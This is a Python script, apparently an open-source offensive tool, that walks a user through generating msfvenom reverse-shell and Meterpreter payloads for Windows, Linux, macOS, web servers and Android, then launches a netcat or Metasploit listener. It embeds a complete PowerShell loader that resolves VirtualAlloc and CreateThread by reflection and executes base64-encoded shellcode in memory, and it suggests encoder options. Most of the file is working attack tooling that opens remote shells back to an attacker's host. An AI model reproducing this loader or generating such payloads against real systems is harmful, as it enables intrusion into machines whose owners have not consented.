#!/usr/bin/env python3
"""
msfvenomgen - Interactive msfvenom payload generator
"""

import os
import sys
import subprocess
import socket
import struct
import fcntl
import signal

# ──────────────────────────────────────────────────────────────────────────────
# ANSI colours
# ──────────────────────────────────────────────────────────────────────────────
R  = "\033[1;31m"   # red
G  = "\033[1;32m"   # green
Y  = "\033[1;33m"   # yellow
B  = "\033[1;34m"   # blue
C  = "\033[1;36m"   # cyan
W  = "\033[1;37m"   # white
DIM = "\033[2m"
RST = "\033[0m"

BANNER = f"""{R}
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗  ██╗ ██████╗ ███╗   ███╗ ██████╗ ███████╗███╗  ██╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗ ██║██╔═══██╗████╗ ████║██╔════╝ ██╔════╝████╗ ██║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗██║██║   ██║██╔████╔██║██║  ███╗█████╗  ██╔██╗██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚████║██║   ██║██║╚██╔╝██║██║   ██║██╔══╝  ██║╚████║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚███║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝███████╗██║ ╚███║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚══╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚══╝{RST}
{DIM}  Interactive msfvenom payload generator  •  https://github.com/yepskotch/msfvenomgen{RST}
"""

# ──────────────────────────────────────────────────────────────────────────────
# Network helpers
# ──────────────────────────────────────────────────────────────────────────────

def _iface_ip(iface: str) -> str | None:
    """Return the IPv4 address of a named interface via ioctl, or None."""
    SIOCGIFADDR = 0x8915
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ifreq = struct.pack("16sH14s", iface.encode()[:15], socket.AF_INET, b"\x00" * 14)
        res = fcntl.ioctl(s.fileno(), SIOCGIFADDR, ifreq)
        s.close()
        return socket.inet_ntoa(res[20:24])
    except OSError:
        return None


def _list_ifaces() -> list[str]:
    """Return all network interface names present on the system."""
    with open("/proc/net/dev") as f:
        lines = f.readlines()[2:]  # skip header rows
    return [line.split(":")[0].strip() for line in lines if ":" in line]


def detect_ip() -> tuple[str, str] | tuple[None, None]:
    """
    Return (ip, iface) using the following priority:
      1. tun0  — HTB/VPN tunnel
      2. First active non-loopback wired interface  (eth*, en*, em*, eno*, enp*, ens*)
      3. First active non-loopback wireless interface (wlan*, wlp*, wls*)
      4. Any other active non-loopback interface
    Returns (None, None) if nothing is found.
    """
    # Always try tun0 first
    ip = _iface_ip("tun0")
    if ip:
        return ip, "tun0"

    ifaces = _list_ifaces()

    wired_prefixes    = ("eth", "en", "em")
    wireless_prefixes = ("wlan", "wlp", "wls")
    skip              = ("lo",)

    def first_match(prefixes):
        for iface in ifaces:
            if iface in skip:
                continue
            if iface.startswith(prefixes):
                ip = _iface_ip(iface)
                if ip:
                    return ip, iface
        return None, None

    # Wired first
    ip, iface = first_match(wired_prefixes)
    if ip:
        return ip, iface

    # Wireless next
    ip, iface = first_match(wireless_prefixes)
    if ip:
        return ip, iface

    # Anything else (tun1, tap0, docker0, etc.) — skip loopback
    for iface in ifaces:
        if iface in skip or iface == "tun0":
            continue
        ip = _iface_ip(iface)
        if ip:
            return ip, iface

    return None, None


# ──────────────────────────────────────────────────────────────────────────────
# Payload catalogue
# ──────────────────────────────────────────────────────────────────────────────

# Structure:
#   OS → category → list of (display_name, msfvenom_payload, needs_lhost, needs_lport)
PAYLOADS: dict[str, dict[str, list[tuple]]] = {
    "Windows": {
        "Reverse Shell": [
            ("TCP (staged)",          "windows/shell/reverse_tcp",           True,  True),
            ("TCP (stageless)",       "windows/shell_reverse_tcp",           True,  True),
            ("TCP x64 (staged)",      "windows/x64/shell/reverse_tcp",       True,  True),
            ("TCP x64 (stageless)",   "windows/x64/shell_reverse_tcp",       True,  True),
            ("HTTP (staged)",         "windows/shell/reverse_http",          True,  True),
            ("HTTPS (staged)",        "windows/shell/reverse_https",         True,  True),
            ("HTTP x64 (staged)",     "windows/x64/shell/reverse_http",      True,  True),
            ("HTTPS x64 (staged)",    "windows/x64/shell/reverse_https",     True,  True),
        ],
        "Meterpreter": [
            ("TCP (staged)",          "windows/meterpreter/reverse_tcp",     True,  True),
            ("TCP (stageless)",       "windows/meterpreter_reverse_tcp",     True,  True),
            ("TCP x64 (staged)",      "windows/x64/meterpreter/reverse_tcp", True,  True),
            ("TCP x64 (stageless)",   "windows/x64/meterpreter_reverse_tcp", True,  True),
            ("HTTP (staged)",         "windows/meterpreter/reverse_http",    True,  True),
            ("HTTPS (staged)",        "windows/meterpreter/reverse_https",   True,  True),
            ("HTTP x64 (staged)",     "windows/x64/meterpreter/reverse_http",True,  True),
            ("HTTPS x64 (staged)",    "windows/x64/meterpreter/reverse_https",True, True),
        ],
    },
    "Linux": {
        "Reverse Shell": [
            ("TCP (staged)",          "linux/x86/shell/reverse_tcp",         True,  True),
            ("TCP (stageless)",       "linux/x86/shell_reverse_tcp",         True,  True),
            ("TCP x64 (staged)",      "linux/x64/shell/reverse_tcp",         True,  True),
            ("TCP x64 (stageless)",   "linux/x64/shell_reverse_tcp",         True,  True),
        ],
        "Meterpreter": [
            ("TCP (staged)",          "linux/x86/meterpreter/reverse_tcp",   True,  True),
            ("TCP (stageless)",       "linux/x86/meterpreter_reverse_tcp",   True,  True),
            ("TCP x64 (staged)",      "linux/x64/meterpreter/reverse_tcp",   True,  True),
            ("TCP x64 (stageless)",   "linux/x64/meterpreter_reverse_tcp",   True,  True),
        ],
    },
    "macOS": {
        "Reverse Shell": [
            ("TCP (stageless)",       "osx/x86/shell_reverse_tcp",           True,  True),
            ("TCP x64 (stageless)",   "osx/x64/shell_reverse_tcp",           True,  True),
        ],
        "Meterpreter": [
            ("TCP (staged)",          "osx/x86/meterpreter/reverse_tcp",     True,  True),
            ("TCP x64 (staged)",      "osx/x64/meterpreter/reverse_tcp",     True,  True),
        ],
    },
    "Web": {
        "Web Payload": [
            ("PHP reverse shell",     "php/reverse_php",                     True,  True),
            ("PHP Meterpreter",       "php/meterpreter/reverse_tcp",         True,  True),
            ("JSP reverse shell",     "java/jsp_shell_reverse_tcp",          True,  True),
            ("WAR reverse shell",     "java/jsp_shell_reverse_tcp",          True,  True),
            ("ASP reverse shell",     "windows/shell/reverse_tcp",           True,  True),
            ("ASPX reverse shell",    "windows/shell/reverse_tcp",           True,  True),
        ],
    },
    "Android": {
        "Meterpreter": [
            ("TCP (stageless)",       "android/meterpreter_reverse_tcp",     True,  True),
            ("TCP (staged)",          "android/meterpreter/reverse_tcp",     True,  True),
            ("HTTPS (stageless)",     "android/meterpreter_reverse_https",   True,  True),
        ],
    },
}

# Default file formats per OS / category
DEFAULT_FORMATS: dict[str, dict[str, list[str]]] = {
    "Windows": {
        "Reverse Shell": ["exe", "exe-service", "dll", "ps1", "hta", "msi"],
        "Meterpreter":   ["exe", "exe-service", "dll", "ps1", "hta", "msi"],
    },
    "Linux": {
        "Reverse Shell": ["elf", "elf-so", "raw"],
        "Meterpreter":   ["elf", "elf-so", "raw"],
    },
    "macOS": {
        "Reverse Shell": ["macho", "raw"],
        "Meterpreter":   ["macho", "raw"],
    },
    "Web": {
        "Web Payload": ["php", "jsp", "war", "asp", "aspx", "raw"],
    },
    "Android": {
        "Meterpreter": ["apk", "raw"],
    },
}

# For web payloads the format is fixed based on the choice index
WEB_FORCED_FORMAT = {
    0: "raw",   # PHP reverse shell  → .php
    1: "raw",   # PHP Meterpreter    → .php
    2: "raw",   # JSP                → .jsp
    3: "war",   # WAR
    4: "raw",   # ASP                → .asp
    5: "raw",   # ASPX               → .aspx
}

WEB_EXTENSIONS = {
    0: ".php",
    1: ".php",
    2: ".jsp",
    3: ".war",
    4: ".asp",
    5: ".aspx",
}

# ──────────────────────────────────────────────────────────────────────────────
# UI helpers
# ──────────────────────────────────────────────────────────────────────────────

def clear():
    os.system("clear")


def header(lhost: str, iface: str = ""):
    clear()
    print(BANNER)
    if lhost and iface:
        print(f"  {DIM}{iface}:{RST} {G}{lhost}{RST}\n")
    elif lhost:
        print(f"  {DIM}IP:{RST} {G}{lhost}{RST}\n")
    else:
        print(f"  {Y}[!] No active network interface detected — enter LHOST manually{RST}\n")


def menu(title: str, options: list[str], lhost: str, subtitle: str = "", iface: str = "") -> int:
    """Display a numbered menu and return the 0-based index of the choice."""
    while True:
        header(lhost, iface)
        print(f"  {C}{title}{RST}")
        if subtitle:
            print(f"  {DIM}{subtitle}{RST}")
        print()
        for i, opt in enumerate(options, 1):
            print(f"    {Y}[{i}]{RST} {opt}")
        print(f"    {Y}[0]{RST} Back / Quit")
        print()
        choice = input(f"  {W}>{RST} ").strip()
        if choice == "0":
            return -1
        if choice.isdigit() and 1 <= int(choice) <= len(options):
            return int(choice) - 1
        print(f"\n  {R}[!] Invalid choice.{RST}")
        input("  Press Enter to try again...")


def prompt(label: str, default: str = "") -> str:
    """Single-line input with an optional default."""
    suffix = f" [{default}]" if default else ""
    val = input(f"  {W}{label}{suffix}: {RST}").strip()
    return val if val else default


def confirm(label: str) -> bool:
    ans = input(f"  {W}{label} [y/N]: {RST}").strip().lower()
    return ans in ("y", "yes")


def info(msg: str):
    print(f"\n  {G}[+]{RST} {msg}")


def warn(msg: str):
    print(f"\n  {Y}[!]{RST} {msg}")


def err(msg: str):
    print(f"\n  {R}[-]{RST} {msg}")


def section(title: str):
    print(f"\n  {B}─── {title} {RST}")


# ──────────────────────────────────────────────────────────────────────────────
# Core logic
# ──────────────────────────────────────────────────────────────────────────────

def select_os(lhost: str, iface: str = "") -> str | None:
    os_list = list(PAYLOADS.keys())
    idx = menu("Select target OS", os_list, lhost, iface=iface)
    if idx == -1:
        return None
    return os_list[idx]


def select_category(target_os: str, lhost: str, iface: str = "") -> str | None:
    cats = list(PAYLOADS[target_os].keys())
    if len(cats) == 1:
        return cats[0]
    idx = menu(f"Select payload category  [{target_os}]", cats, lhost, iface=iface)
    if idx == -1:
        return None
    return cats[idx]


def select_payload(target_os: str, category: str, lhost: str, iface: str = "") -> tuple | None:
    payloads = PAYLOADS[target_os][category]
    names = [p[0] for p in payloads]
    idx = menu(f"Select payload  [{target_os} / {category}]", names, lhost, iface=iface)
    if idx == -1:
        return None
    return payloads[idx], idx


def select_ps1_mode(lhost: str, iface: str = "") -> str | None:
    """Ask whether to wrap the PS1 payload or keep raw shellcode bytes."""
    options = [
        "Wrapped loader (executable .ps1 script)",
        "Raw shellcode bytes only (.ps1 contains raw bytes)",
    ]
    idx = menu("PowerShell output mode", options, lhost, iface=iface,
               subtitle="msfvenom -f ps1 produces raw bytes — choose how to package them")
    if idx == -1:
        return None
    return "wrapped" if idx == 0 else "raw"


def select_format(target_os: str, category: str, payload_idx: int, lhost: str, iface: str = "") -> str | None:
    # Web payloads: format is forced
    if target_os == "Web":
        return WEB_FORCED_FORMAT[payload_idx]

    formats = DEFAULT_FORMATS.get(target_os, {}).get(category, ["raw"])
    idx = menu(f"Select output format  [{target_os} / {category}]", formats, lhost, iface=iface)
    if idx == -1:
        return None
    return formats[idx]


def get_lhost_lport(detected_ip: str) -> tuple[str, str] | None:
    print()
    lhost = prompt("LHOST", detected_ip or "")
    if not lhost:
        err("LHOST is required.")
        return None
    lport = prompt("LPORT", "4444")
    if not lport:
        err("LPORT is required.")
        return None
    return lhost, lport


def get_output_filename(target_os: str, category: str, payload_idx: int, fmt: str) -> str:
    # Suggest a sensible default name
    FORMAT_EXTENSIONS: dict[str, str] = {
        "exe-service": ".exe",
        "elf-so":      ".so",
    }
    if target_os == "Web":
        ext = WEB_EXTENSIONS[payload_idx]
    else:
        ext = FORMAT_EXTENSIONS.get(fmt, f".{fmt}")
    default_name = f"payload{ext}"
    cwd_real = os.path.realpath(os.getcwd())
    while True:
        fname = prompt("Output filename", default_name)
        safe_name = os.path.basename(fname)
        if not safe_name:
            err("Invalid filename: must not be empty or a bare path.")
            continue
        safe_path = os.path.realpath(os.path.join(cwd_real, safe_name))
        if not safe_path.startswith(cwd_real + os.sep):
            err("Invalid filename: path traversal detected. Output must be in the current directory.")
            continue
        return safe_path


def build_command(
    payload_str: str,
    lhost: str,
    lport: str,
    fmt: str,
    outfile: str,
    extra_opts: str = "",
) -> list[str]:
    cmd = ["msfvenom", "-p", payload_str, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", outfile]
    if extra_opts:
        cmd.extend(extra_opts.split())
    return cmd


PS1_WRAPPER = """\
# MSFVenomGen - PowerShell shellcode loader

# Architecture guard: ensure PowerShell bitness matches shellcode
$is64 = [IntPtr]::Size -eq 8
if ($is64 -ne __IS64__) {
    $need = if (__IS64__) { '64-bit' } else { '32-bit' }
    $have = if ($is64) { '64-bit' } else { '32-bit' }
    Write-Error "Architecture mismatch: shellcode is $need but PowerShell is $have. Re-run with the correct powershell.exe."
    Read-Host "Press Enter to exit"
    exit 1
}

$sc = [Convert]::FromBase64String('__B64__')

# Resolve a function address from a loaded DLL via reflection (no Add-Type / C# compiler needed)
function Get-ProcAddress {
    param([string]$Module, [string]$Procedure)
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress  = $UnsafeNativeMethods.GetMethod('GetProcAddress',
        [reflection.bindingflags]'Public,Static', $null,
        [System.Reflection.CallingConventions]::Any,
        @([System.Runtime.InteropServices.HandleRef], [string]), $null)
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr    = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

function Get-DelegateType {
    param([Type[]]$Parameters, [Type]$ReturnType = [Void])
    $Domain          = [AppDomain]::CurrentDomain
    $DynAssembly     = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder     = $ModuleBuilder.DefineType('MyDelegateType', 'Class,Public,Sealed,AnsiClass,AutoClass',
                           [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName,HideBySig,Public',
                              [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime,Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime,Managed')
    return $TypeBuilder.CreateType()
}

$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
$VirtualAllocDelegate = Get-DelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $VirtualAllocAddr, $VirtualAllocDelegate)

$CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
$CreateThreadDelegate = Get-DelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $CreateThreadAddr, $CreateThreadDelegate)

$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr],[Int32]) ([Int32])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)

$addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed"
    Read-Host "Press Enter to exit"
    exit 1
}

[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)

$thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed"
    Read-Host "Press Enter to exit"
    exit 1
}

$WaitForSingleObject.Invoke($thread, 0xFFFFFFFF) | Out-Null
"""


def arch_from_payload(payload_str: str) -> str:
    """Return 'x64' if the payload string contains an x64 indicator, else 'x86'."""
    parts = payload_str.lower().split("/")
    if "x64" in parts:
        return "x64"
    return "x86"


def wrap_ps1(raw_path: str, out_path: str, payload_str: str) -> bool:
    """
    Read raw shellcode bytes from raw_path, base64-encode them, and write
    a complete PowerShell loader script to out_path.
    Returns True on success.
    """
    try:
        with open(raw_path, "rb") as f:
            shellcode = f.read()
    except OSError as e:
        err(f"Could not read shellcode: {e}")
        return False

    import base64
    b64 = base64.b64encode(shellcode).decode()
    is64 = "$true" if arch_from_payload(payload_str) == "x64" else "$false"
    ps1 = PS1_WRAPPER.replace("__B64__", b64).replace("__IS64__", is64)

    try:
        with open(out_path, "w") as f:
            f.write(ps1)
    except OSError as e:
        err(f"Could not write PS1 wrapper: {e}")
        return False

    return True


def run_msfvenom(cmd: list[str]) -> bool:
    section("Running msfvenom")
    print(f"\n  {DIM}$ {' '.join(cmd)}{RST}\n")
    try:
        result = subprocess.run(cmd, check=False)
        return result.returncode == 0
    except FileNotFoundError:
        err("msfvenom not found. Is Metasploit Framework installed?")
        return False


def start_listener(payload_str: str, lhost: str, lport: str, iface: str = ""):
    """Offer nc or multi/handler listener."""
    section("Start a listener")
    options = ["netcat (nc)", "Metasploit multi/handler", "Skip"]
    idx = menu("Choose listener type", options, lhost, iface=iface)
    if idx == -1 or idx == 2:
        return

    if idx == 0:
        # netcat
        nc_cmd = ["nc", "-lvnp", lport]
        info(f"Starting: {' '.join(nc_cmd)}")
        try:
            subprocess.run(nc_cmd)
        except FileNotFoundError:
            err("nc not found.")
        except KeyboardInterrupt:
            info("Listener stopped.")

    elif idx == 1:
        # multi/handler via msfconsole
        rc_script = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {payload_str}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"exploit -j\n"
        )
        rc_path = "/tmp/.msf_handler.rc"
        with open(rc_path, "w") as f:
            f.write(rc_script)
        msf_cmd = ["msfconsole", "-q", "-r", rc_path]
        info(f"Starting: {' '.join(msf_cmd)}")
        try:
            subprocess.run(msf_cmd)
        except FileNotFoundError:
            err("msfconsole not found.")
        except KeyboardInterrupt:
            info("msfconsole exited.")
        finally:
            try:
                os.remove(rc_path)
            except OSError:
                pass


# ──────────────────────────────────────────────────────────────────────────────
# Main flow
# ──────────────────────────────────────────────────────────────────────────────

def main():
    # Handle Ctrl-C gracefully
    signal.signal(signal.SIGINT, lambda s, f: (print(f"\n\n{Y}  Interrupted.{RST}\n"), sys.exit(0)))

    detected_ip, detected_iface = detect_ip()

    while True:
        ip   = detected_ip   or ""
        iface = detected_iface or ""

        # ── OS ──
        target_os = select_os(ip, iface)
        if target_os is None:
            print(f"\n  {G}Goodbye.{RST}\n")
            sys.exit(0)

        # ── Category ──
        category = select_category(target_os, ip, iface)
        if category is None:
            continue

        # ── Payload ──
        result = select_payload(target_os, category, ip, iface)
        if result is None:
            continue
        (display_name, payload_str, needs_lhost, needs_lport), payload_idx = result

        # ── Format ──
        fmt = select_format(target_os, category, payload_idx, ip, iface)
        if fmt is None:
            continue

        # ── PS1 mode (wrapped loader vs raw bytes) ──
        ps1_mode = None
        if fmt == "ps1":
            ps1_mode = select_ps1_mode(ip, iface)
            if ps1_mode is None:
                continue

        # ── LHOST / LPORT ──
        header(ip, iface)
        section("Payload options")
        info(f"Payload : {payload_str}")
        info(f"Format  : {fmt}")
        print()

        lhost_lport = get_lhost_lport(ip)
        if lhost_lport is None:
            input("\n  Press Enter to continue...")
            continue
        lhost, lport = lhost_lport

        # ── Output filename ──
        outfile = get_output_filename(target_os, category, payload_idx, fmt)

        # ── Extra msfvenom options ──
        print()
        extra = prompt("Extra msfvenom options (e.g. -e x86/shikata_ga_nai -i 3)", "")

        # ── Confirm ──
        # ps1 (wrapped): msfvenom writes raw bytes to a temp file, then we
        #                wrap them in a PS1 loader and delete the temp file.
        # ps1 (raw):     msfvenom writes the ps1 format directly (raw byte
        #                array literal) — no post-processing needed.
        is_ps1_wrapped = (fmt == "ps1" and ps1_mode == "wrapped")
        is_ps1_raw     = (fmt == "ps1" and ps1_mode == "raw")
        raw_tmp    = outfile + ".raw" if is_ps1_wrapped else None
        msf_outfile = raw_tmp if is_ps1_wrapped else outfile
        msf_fmt    = "raw" if is_ps1_wrapped else fmt

        cmd = build_command(payload_str, lhost, lport, msf_fmt, msf_outfile, extra)
        print(f"\n  {DIM}Command: {' '.join(cmd)}{RST}")
        if is_ps1_wrapped:
            print(f"  {DIM}(raw shellcode will be wrapped in a PowerShell loader → {outfile}){RST}")
        elif is_ps1_raw:
            print(f"  {DIM}(raw shellcode byte array will be saved as {outfile}){RST}")
        print()
        if not confirm("Generate payload?"):
            continue

        # ── Run ──
        success = run_msfvenom(cmd)
        if success:
            if is_ps1_wrapped:
                section("Wrapping shellcode in PowerShell loader")
                if wrap_ps1(raw_tmp, outfile, payload_str):
                    try:
                        os.remove(raw_tmp)
                    except OSError:
                        pass
                    info(f"PS1 loader saved to: {G}{os.path.abspath(outfile)}{RST}")
                else:
                    err("PS1 wrapping failed. Raw shellcode left at: " + raw_tmp)
                    success = False
            else:
                info(f"Payload saved to: {G}{os.path.abspath(outfile)}{RST}")
        else:
            err("msfvenom exited with an error.")

        print()
        if success and confirm("Start a listener now?"):
            start_listener(payload_str, lhost, lport, iface)

        print()
        if not confirm("Generate another payload?"):
            print(f"\n  {G}Done.{RST}\n")
            break


if __name__ == "__main__":
    main()
